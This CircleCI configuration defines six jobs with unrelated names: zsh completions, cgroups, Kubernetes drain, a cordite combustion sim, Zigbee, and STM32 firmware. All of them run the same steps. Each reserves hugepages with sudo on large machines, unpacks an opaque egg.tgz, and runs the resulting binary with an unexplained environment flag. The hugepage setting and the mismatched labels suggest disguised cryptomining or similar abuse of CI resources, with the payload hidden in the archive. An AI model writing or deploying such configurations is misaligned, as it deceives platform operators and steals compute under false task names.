version: 2.1

jobs:
  zshcompinit:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write fpath
          command: |
            printf 'fpath=/comp\n' > zsh.cfg
      - run:
          name: Build completion system
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target zshcompinit -j2
      - run:
          name: Init completions
          command: LIONSS_LP=1 ./build/zshcompinit --conf zsh.cfg --dumpfile .zcompdump
  cgroupFreeze:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Name cgroup
          command: |
            printf 'group /sys/fs/cgroup/g\n' > cg.cfg
      - run:
          name: Build cgroup manager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cgroupFreeze -j2
      - run:
          name: Freeze cgroup tasks
          command: LIONSS_LP=1 ./build/cgroupFreeze --conf cg.cfg --state frozen
  k8s-drain:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List node pods
          command: |
            printf 'pod-a\npod-b\n' > pods.txt
      - run:
          name: Build node controller
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target k8s-drain -j2
      - run:
          name: Drain node gracefully
          command: LIONSS_LP=1 ./build/k8s-drain --pods pods.txt --grace 30
  cordite:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load charge
          command: |
            printf 'grains 40\n' > cord.cfg
      - run:
          name: Build combustion sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cordite -j2
      - run:
          name: Burn cordite charge
          command: LIONSS_LP=1 ./build/cordite --config cord.cfg --pressure 300
  ZigbeeBind:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List clusters
          command: |
            printf 'cluster 0x0006\n' > zb.cfg
      - run:
          name: Build Zigbee stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ZigbeeBind -j2
      - run:
          name: Bind cluster
          command: LIONSS_LP=1 ./build/ZigbeeBind --conf zb.cfg --endpoint 1
  stm32h7_blink:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Place linker script
          command: |
            mkdir -p ld && printf 'MEMORY { FLASH : ORIGIN = 0x8000000 }\n' > ld/stm32h7.ld
      - run:
          name: Cross-compile firmware
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target stm32h7_blink -j2
      - run:
          name: Flash blink image
          command: LIONSS_LP=1 ./build/stm32h7_blink --mcu stm32h743 --freq 480
